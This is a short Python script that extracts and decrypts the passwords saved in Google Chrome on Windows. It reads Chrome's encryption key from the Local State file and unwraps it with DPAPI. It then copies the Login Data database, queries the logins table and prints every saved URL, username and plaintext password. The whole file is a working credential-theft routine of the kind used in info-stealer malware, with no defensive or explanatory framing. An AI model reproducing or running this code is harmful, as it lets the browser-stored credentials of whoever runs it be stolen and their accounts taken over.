import sqlite3
import shutil
import json
import base64
import win32crypt
from Crypto.Cipher import AES
from os import environ

# get the current user's Google Chrome password encryption key 
def getEncryptionKey(username: str):
    # File path containing encryption keys for password encryption
    localStatePath = f"c:/Users/{username}/AppData/Local/Google/Chrome/User Data/Local State"

    # Get the JSON object containing encryption key 
    with open(localStatePath, 'r', encoding="utf-8") as efile:
        localState = efile.read()
        localState = json.loads(localState)

    # Extract the encryption key
    decryptionKey = base64.b64decode(localState["os_crypt"]["encrypted_key"])
    decryptionKey = decryptionKey[5:]

    # Return the encryption key as decrypted with current user's dpapi keys
    return win32crypt.CryptUnprotectData(decryptionKey, None, None, None, 0)[1]

def decrypt_password(password, key):
    # get the initialization vector
    iv = password[3:15]
    password = password[15:]
    # generate cipher
    cipher = AES.new(key, AES.MODE_GCM, iv)
    # decrypt password
    return cipher.decrypt(password)[:-16].decode()

# Get the username of a user
USER = environ.get("USERNAME")
key = getEncryptionKey(USER)
chrome_passwords_file_path = f"c:/Users/{USER}/AppData/Local/Google/Chrome/User Data/Default/Login Data"

# create a copy of the Login Data file to local directory
shutil.copy2(chrome_passwords_file_path, "./Loginvault.db") 

# Connect to the database and extract all records 
conn = sqlite3.connect("Loginvault.db")
cursor = conn.cursor()
cursor.execute("SELECT action_url, username_value, password_value FROM logins")
passwords = cursor.fetchall()

# Print all records and passwords
for index,login in enumerate(passwords):

    url = login[0]
    username = login[1]
    ciphertext= login[2]

    print("Url: ", url)
    print("Username: ", username)
    print("Password: ", decrypt_password(ciphertext, key))
    print("\n")
